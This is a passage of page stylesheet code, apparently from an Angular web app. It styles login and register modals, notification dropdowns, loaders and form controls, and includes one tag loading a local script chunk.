            font-weight: 400;
            font-size: 14px;
            color: #fff;
            text-decoration: none;
            text-transform: uppercase;
            float: left;
            width: 50%;
            text-align: center;
            height: 22px;
            line-height: 32px;
            position: relative;
            margin-top: -20px
        }

        header .pop-mobile-menu .set-log a:after {
            content: '';
            width: 1px;
            height: 32px;
            position: absolute;
            right: 0;
            top: 0;
            background-color: #fff
        }

        header .pop-mobile-menu .set-log a:last-child:after {
            display: none
        }

        header .pop-mobile-menu .set-log a img {
            max-width: 16px;
            display: inline-block;
            vertical-align: middle;
            margin-left: 4px
        }

        .modal-popup {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            opacity: 0;
            visibility: hidden;
            transition: all .3s ease-in-out;
            border-radius: 6px
        }

        .modal-popup.active {
            opacity: 1;
            visibility: visible;
            z-index: 99
        }

        .modal-popup.active::before {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            background: #000;
            opacity: .95
        }

        .modal-popup .template-wrap {
            position: relative;
            width: 40%;
            margin: 30px auto auto
        }

        .modal-popup .template-wrap::before {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            -webkit-backdrop-filter: blur(11px);
            backdrop-filter: blur(11px);
            background-color: rgba(106, 112, 125, .36)
        }

        .modal-popup button.close {
            outline: 0;
            position: absolute;
            right: 20px;
            top: 20px;
            opacity: 1;
            z-index: 91
        }

        .modal-popup button.close span {
            font-family: Montserrat;
            color: #fff;
            font-size: 2em;
            font-weight: 400
        }

        .modal-popup .modal-header {
            position: relative;
            border-bottom: none;
            z-index: 9
        }

        .modal-popup .modal-body {
            padding: 0 30px
        }

        .modal-popup .styled-checkbox {
            position: absolute;
            opacity: 0
        }

        .modal-popup .styled-checkbox+label {
            position: relative;
            cursor: pointer;
            padding: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .8em;
            font-weight: 400
        }

        .modal-popup .styled-checkbox+label:before {
            content: '';
            margin-right: 10px;
            display: inline-block;
            vertical-align: text-top;
            width: 20px;
            height: 20px;
            border-radius: 100%;
            background: 0 0;
            border: 1px solid #fff
        }

        .modal-popup .styled-checkbox:focus+label:before {
            box-shadow: 0 0 0 3px rgba(0, 0, 0, .12)
        }

        .modal-popup .styled-checkbox:checked+label:before {
            background: 0 0;
            border: 1px solid #fff
        }

        .modal-popup .styled-checkbox:disabled+label {
            color: #b8b8b8;
            cursor: auto
        }

        .modal-popup .styled-checkbox:disabled+label:before {
            box-shadow: none;
            background: #ddd
        }

        .modal-popup .styled-checkbox:checked+label:after {
            content: '';
            position: absolute;
            left: 6px;
            top: 6px;
            background: #fff;
            width: 7px;
            height: 7px;
            border-radius: 100%
        }

        .modal-popup .modal-footer {
            text-align: center;
            background: #1d1f23;
            border-top: 0;
            position: relative;
            z-index: 9
        }

        .modal-popup .modal-footer p {
            font-family: Montserrat;
            font-size: .9em;
            color: #fff
        }

        .modal-popup .modal-footer p>a {
            font-family: Montserrat;
            color: #fff;
            text-decoration: none;
            font-weight: 600;
            transition: all .3s ease-in-out
        }

        .modal-popup .modal-footer p>a:hover {
            color: #d0021b
        }

        .modal-popup h4 {
            font-family: Montserrat-Bold;
            font-size: 2em;
            font-weight: 600;
            color: #fff;
            line-height: 1.5
        }

        .modal-popup p {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            color: #fff
        }

        .modal-popup label.input-label {
            font-family: Montserrat;
            font-size: .9em;
            color: #fff;
            font-weight: 400;
            display: block
        }

        .modal-popup .form-group {
            clear: both;
            position: relative
        }

        .modal-popup .form-group i {
            cursor: pointer;
            position: absolute;
            right: 5px;
            top: 30px;
            color: #fff
        }

        .modal-popup .form-group .form-group__remember {
            display: inline-block;
            vertical-align: middle;
            margin: 30px 0
        }

        .modal-popup .form-group .form-group__remember.form-group__remember--left {
            float: left
        }

        .modal-popup .form-group .form-group__remember.form-group__remember--right {
            float: right
        }

        .modal-popup .form-group .form-group__remember.form-group__remember--right>a {
            font-family: Montserrat;
            font-size: .8em;
            font-weight: 600;
            text-decoration: none;
            color: #fff;
            text-transform: uppercase
        }

        .modal-popup .form-control {
            outline: 0;
            border-radius: 0;
            padding: 0;
            box-shadow: none;
            font-family: Montserrat;
            color: #fff;
            font-size: 1em
        }

        .modal-popup .form-control.form-control--default {
            background: 0 0;
            border: none;
            border-bottom: 1px solid #afafb9
        }

        .modal-popup .cta-wrap {
            width: 80%;
            overflow: hidden;
            margin: auto
        }

        .modal-popup .or-wrap {
            text-align: center;
            position: relative;
            margin: 20px 0
        }

        .modal-popup .or-wrap::before {
            position: absolute;
            content: "";
            left: 0;
            top: 10px;
            height: 1px;
            background: #d0021b;
            width: 40%
        }

        .modal-popup .or-wrap:after {
            position: absolute;
            content: "";
            right: 0;
            top: 10px;
            height: 1px;
            background: #d0021b;
            width: 40%
        }

        .modal-popup .or-wrap h5 {
            font-family: Montserrat;
            color: #fff;
            font-size: .8em
        }

        .modal-popup .media-wrap {
            text-align: center;
            position: relative;
            margin: 20px 0
        }

        .modal-popup .media-wrap h5 {
            font-family: Montserrat;
            color: #fff;
            font-size: .8em
        }

        .modal-popup .media-wrap .media-wrap__item {
            display: inline-block;
            vertical-align: middle;
            margin: 20px 20px 0
        }

        .modal-popup .media-wrap .media-wrap__item>a {
            display: inline-block
        }

        .modal-popup .media-wrap .media-wrap__item>a img {
            width: 40px
        }

        .modal-popup .cta {
            outline: 0;
            display: block
        }

        .modal-popup .cta.cta--redsolid {
            width: 100%;
            background: #d0021b;
            border: 1px solid transparent;
            font-family: Montserrat;
            font-size: 1em;
            text-transform: uppercase;
            color: #fff;
            margin: auto;
            padding: 10px;
            border-radius: 4px
        }

        .modal-open .modal.fade {
            opacity: .9;
            z-index: 99999;
            background: #000
        }

        .before-login {
            display: inline-block;
            margin-top: 2px;
            transition: all .3s ease-in-out
        }

        .before-login .login-btn,
        .before-login .register-btn {
            margin-top: 8px;
            display: inline-block
        }

        .before-login .login-btn {
            padding-right: 6px
        }

        .before-login .login-btn a,
        .before-login .register-btn a {
            cursor: pointer;
            color: #fff;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            text-decoration: none
        }

        li.dropdown {
            display: inline-block;
            width: auto;
            position: relative
        }

        .dropdown:hover .isi-dropdown {
            display: block
        }

        .isi-dropdown {
            margin-left: 0 !important;
            width: 270px;
            position: absolute;
            display: none;
            box-shadow: 0 8px 16px 0 rgba(0, 0, 0, .2);
            z-index: 1;
            background: #1d1f23;
            opacity: .8;
            transition: all .3s ease-in-out
        }

        .isi-dropdown a,
        .isi-dropdown a:hover {
            color: #fff !important;
            opacity: 100% !important
        }

        .list-decoration {
            list-style-type: none;
            padding-left: 20px
        }

        .notif {
            right: -2%;
            color: #000;
            background: #d6d6d6;
            border-radius: 4px;
            font-size: 1.2rem;
            line-height: 1.3;
            max-width: 330px;
            min-width: 330px;
            position: absolute;
            z-index: 20;
            margin-top: 30px;
            padding: 0 2px 2px 0
        }

        .notif.area {
            min-width: 370px !important;
            max-width: 500px !important
        }

        .notif__scroll {
            padding: 10px;
            max-height: 500px;
            overflow: auto
        }

        @media (max-width:767px) {
            .notif {
                min-width: -webkit-fill-available;
                right: 0;
                margin-right: 0;
                width: -webkit-fit-content;
                width: -moz-fit-content;
                width: fit-content;
                max-width: -webkit-fit-content;
                max-width: -moz-fit-content;
                max-width: fit-content;
                margin-top: 1px;
                border-radius: 0
            }
            .notif__scroll {
                max-height: 575px
            }
        }

        .notif__frame {
            border-top: 1px dashed #a5a4a4;
            padding-top: 10px;
            margin-top: 10px
        }

        .notif__title {
            font-weight: 700;
            margin-bottom: 10px;
            color: #000
        }

        .notif__img {
            width: 20%;
            float: left;
            margin-right: 5px
        }

        .notif__img.position {
            text-align: center
        }

        .notif__img img {
            border-radius: 80px;
            width: 50px;
            border: 0
        }

        .notif__img .notif-icon {
            border-radius: 50%;
            width: 50px;
            height: 50px
        }

        .notif__contain {
            font-family: Montserrat;
            font-size: 12px;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: normal;
            letter-spacing: normal;
            color: #69707e;
            float: left
        }

        .notif__contain .notif-image {
            width: 140px;
            height: 72px;
            margin-right: 3%
        }

        @media (max-width:767px) {
            .notif__img {
                width: 60px
            }
            .notif__contain .notif-image {
                width: 130px;
                height: 67px
            }
            .notif__contain .notif-image.image-position {
                float: none;
                vertical-align: top
            }
        }

        .notif .notif-desc {
            position: absolute;
            margin-right: 10px
        }

        .notif__validIcon {
            width: 75%
        }

        .notif__validIcon .notif-area {
            position: relative
        }

        .notif__validIcon .notif-area .d-absolute--center {
            width: 35%;
            top: 15%;
            left: 10%
        }

        .notif__nonValidIcon {
            width: 100%
        }

        .notif__nonValidIcon .notif-desc {
            position: relative
        }

        .notif__close {
            text-align: right;
            cursor: pointer
        }

        .notif__close img {
            width: 6%
        }

        .notif p {
            margin: 0 0 10px
        }

        .notif p:last-of-type {
            margin-bottom: 0
        }

        .notif::after {
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-bottom: 10px solid #d6d6d6;
            top: -10px;
            content: "";
            position: absolute;
            right: 20px
        }

        .view-more {
            cursor: pointer;
            margin-top: 20px;
            font-size: 12px;
            font-weight: 700;
            font-family: Montserrat-bold;
            color: #ce0b24;
            display: inherit
        }

        .view-more.view-position {
            margin-top: 5px
        }

        .view-more:hover {
            color: #e03950
        }

        .view-detail {
            cursor: pointer;
            margin-top: 10px;
            font-size: 12px;
            font-family: Montserrat-Bold;
            color: #6d6d76;
            display: inherit
        }

        .view-detail:hover {
            color: #6d6d76
        }

        .notifMobile {
            display: none
        }

        @media (max-width:767px) {
            .notif__validIcon .notif-area .d-absolute--center {
                left: 6%
            }
            .notif__validIcon .notif-area .d-absolute--center>img {
                width: 45px
            }
            .notif::after {
                border: 0
            }
            .view-more.view-position {
                margin-bottom: 10px
            }
            .notifMobile__validIcon .notif-desc {
                position: absolute;
                margin-right: 10px;
                margin-top: -2px
            }
            .notifMobile__nonValidIcon .notif-desc {
                position: relative
            }
        }

        .flagNotif {
            background: red;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-top: -20px;
            margin-left: 10px;
            position: absolute
        }

        .notifList {
            color: #000;
            background: #25262b;
            border-radius: 4px;
            font-size: 1.2rem;
            line-height: 1.3;
            margin: 19px auto 40px -255px;
            width: 416px;
            height: 200px;
            position: absolute;
            z-index: 10
        }

        .notifList .empty-text {
            position: absolute;
            left: 0;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            color: #fff;
            font-size: 16px
        }

        .notifList.is-have-notification {
            height: auto
        }

        @media only screen and (max-width:1024px) {
            .notifMobile {
                display: block
            }
            .notifList {
                margin-right: 0;
                margin-left: 0;
                margin-top: 0;
                max-width: -webkit-max-content;
                max-width: -moz-max-content;
                max-width: max-content;
                min-width: 100%;
                max-height: -webkit-max-content;
                max-height: -moz-max-content;
                max-height: max-content;
                border-radius: 0
            }
        }

        .notifList__scroll {
            max-height: 500px;
            background: #25262b;
            overflow: auto
        }

        .notifList__head {
            padding: 15px
        }

        .notifList__body {
            padding-top: 20px;
            padding-bottom: 20px;
            border-top: 1px solid transparent;
            -o-border-image: linear-gradient(to right, #1e2024, #3e3e3f, #1e2024);
            border-image: linear-gradient(to right, #1e2024, #3e3e3f, #1e2024);
            border-image-slice: 1;
            display: flex
        }

        .notifList__body__icon {
            width: 20%;
            text-align: center;
            float: left
        }

        .notifList__body__icon .notif-avatar {
            border-radius: 50%;
            width: 50px;
            height: 50px;
            border: 0
        }

        .notifList__body__contain {
            color: #e0dede;
            float: left;
            font-family: Montserrat;
            font-size: 12px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.42;
            letter-spacing: normal
        }

        .notifList__body__contain__title {
            font-weight: 500;
            color: #b4b4c0;
            font-size: 12px;
            margin-bottom: 10px
        }

        .notifList__body__contain__category {
            margin-bottom: 5px;
            display: flex
        }

        .notifList__body__contain__category__val {
            font-weight: 400;
            background: #d0021b;
            border-radius: 3px;
            padding: 3px 9px 3px 10px
        }

        .notifList__body__contain__value {
            color: #fff
        }

        .notifList__body__contain__wrapper {
            position: relative;
            min-height: 10px;
            overflow: hidden
        }

        .notifList__body__contain__img {
            float: left;
            margin-right: 3%;
            width: 47%
        }

        .notifList__body__contain__img .d-absolute--center {
            top: 12%;
            right: 27%
        }

        .notifList__body__contain__img__notif-img {
            width: 140px;
            height: 72px
        }

        @media (max-width:767px) {
            .notifList__body__contain__img .d-absolute--center {
                top: 7%;
                right: 25%
            }
            .notifList__body__contain__img__notif-img {
                width: 130px;
                height: 67px
            }
        }

        .notifList__body__contain__description {
            float: left;
            width: 50%
        }

        @media (max-width:767px) {
            .notifList__body__contain__description {
                width: 48%
            }
        }

        .notifList__body__contain__description span {
            font-family: Montserrat-Bold
        }

        .notifList__body__contain__description.full {
            width: 100%
        }

        .notifList__body__validIcon {
            width: 75%
        }

        .notifList__body__nonValidIcon {
            width: 100%;
            margin: 0 15px
        }

        .notifList__body__date {
            margin-top: 10px;
            margin-bottom: 10px;
            color: #b4b4c0;
            font-family: Montserrat-Bold;
            font-size: 12px
        }

        .notifList__body:hover {
            background: #1d1f23
        }

        .notifList__title {
            color: #fff;
            font-size: 18px;
            font-family: Montserrat-Bold
        }

        .notifList p {
            margin: 0 0 10px
        }

        .notifList p:last-of-type {
            margin-bottom: 0
        }

        .notifList::after {
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-bottom: 10px solid #25262b;
            top: -10px;
            content: "";
            position: absolute;
            right: 70px
        }

        @media (max-width:767px) {
            .notifList::after {
                border: 0
            }
        }

        .loader-comment-list {
            padding: 8px;
            text-align: center;
            overflow: hidden
        }

        #style-scroll::-webkit-scrollbar-track {
            -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
            border-radius: 5px;
            background-color: #25262b
        }

        #style-scroll::-webkit-scrollbar {
            width: 6px;
            height: 129px;
            opacity: .2;
            background-color: #9b9b9b
        }

        #style-scroll::-webkit-scrollbar-thumb {
            border-radius: 5px;
            -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, .3);
            background-color: #9b9b9b
        }

        #style-scroll2::-webkit-scrollbar-track {
            background-color: #d6d6d6
        }

        #style-scroll2::-webkit-scrollbar {
            width: 6px;
            height: 129px;
            opacity: .2;
            background-color: #d6d6d6
        }

        #style-scroll2::-webkit-scrollbar-thumb {
            background-color: #b8b5b5
        }

        .loader-comment-list .loader,
        .loader-comment-list .loader:after,
        .loader-comment-list .loader:before {
            border-radius: 50%;
            bottom: 40px;
            width: 15px;
            height: 15px;
            -webkit-animation: 1s ease-in-out infinite load7;
            animation: 1s ease-in-out infinite load7
        }

        .loader-comment-list .loader {
            color: #d0021b;
            font-size: 10px;
            margin: 40px auto 10px;
            position: relative;
            text-indent: -9999em;
            transform: translateZ(0);
            -webkit-animation-delay: -.16s;
            animation-delay: -.16s
        }

        .loader-comment-list .loader:after,
        .loader-comment-list .loader:before {
            content: '';
            position: absolute;
            top: 0
        }

        .loader-comment-list .loader:before {
            left: -3em;
            -webkit-animation-delay: -.32s;
            animation-delay: -.32s
        }

        .loader-comment-list .loader:after {
            left: 3em
        }

        @-webkit-keyframes load7 {
            0%,
            100%,
            80% {
                box-shadow: 0 2.5em 0 -1.3em
            }
            40% {
                box-shadow: 0 2.5em 0 0
            }
        }

        @keyframes load7 {
            0%,
            100%,
            80% {
                box-shadow: 0 2.5em 0 -1.3em
            }
            40% {
                box-shadow: 0 2.5em 0 0
            }
        }

        .visible-tablet {
            display: none
        }

        @media only screen and (max-width:1024px) {
            .notifList__scroll {
                max-height: 540px
            }
            .visible-tablet {
                display: block
            }
        }
    </style>
    <script charset="utf-8" src="22.c7c6474762733abb6f40.js"></script>
    <style>
        .justify-content-left[_ngcontent-gtc-c7] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c7] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c7] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c7] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c7] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c7] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c7] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c7] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c7] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c7] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c7] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c7] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c7] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c7] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c7] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c7] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c7] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c7] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c7] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c7] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c7] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c7] button.mat-icon-button[_ngcontent-gtc-c7] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c7] button.mat-icon-button[_ngcontent-gtc-c7] span.mat-button-wrapper[_ngcontent-gtc-c7],
        .mat-datepicker-toggle[_ngcontent-gtc-c7] button.mat-icon-button[_ngcontent-gtc-c7] span.mat-button-wrapper[_ngcontent-gtc-c7] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c7] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c7] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c7] i.fa-caret-down[_ngcontent-gtc-c7] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c7] input[type=text][_ngcontent-gtc-c7] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option.active[_ngcontent-gtc-c7] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] label[_ngcontent-gtc-c7] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] label[_ngcontent-gtc-c7]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] label[_ngcontent-gtc-c7]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] input[type=radio][_ngcontent-gtc-c7] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c7] .cust-option[_ngcontent-gtc-c7] ul.option-list[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] input[type=radio][_ngcontent-gtc-c7]:checked+label[_ngcontent-gtc-c7]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c7] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c7] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c7],
        label[_ngcontent-gtc-c7],
        ol[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7],
        table[_ngcontent-gtc-c7] td[_ngcontent-gtc-c7],
        table[_ngcontent-gtc-c7] th[_ngcontent-gtc-c7],
        ul[_ngcontent-gtc-c7] li[_ngcontent-gtc-c7] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c7],
        h2[_ngcontent-gtc-c7],
        h3[_ngcontent-gtc-c7],
        h4[_ngcontent-gtc-c7],
        h5[_ngcontent-gtc-c7],
        h6[_ngcontent-gtc-c7],
        p[_ngcontent-gtc-c7],
        span[_ngcontent-gtc-c7] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c7] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c7],
        textarea[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c7] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c7] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c7] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c7] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c7] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c7] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c7] span[_ngcontent-gtc-c7] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c7] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c7] p.close-circle[_ngcontent-gtc-c7] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c7] p.close-circle[_ngcontent-gtc-c7] span[_ngcontent-gtc-c7] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c7] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c7] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c7] span[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c7] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c7] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c7] span[_ngcontent-gtc-c7] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c7] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c7] span[_ngcontent-gtc-c7] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c7] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c7] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c7] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c7] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c7] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c7]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c7]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c7]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c7] span[_ngcontent-gtc-c7] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c7] h3[_ngcontent-gtc-c7] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c7] h4[_ngcontent-gtc-c7] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c7] p[_ngcontent-gtc-c7] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
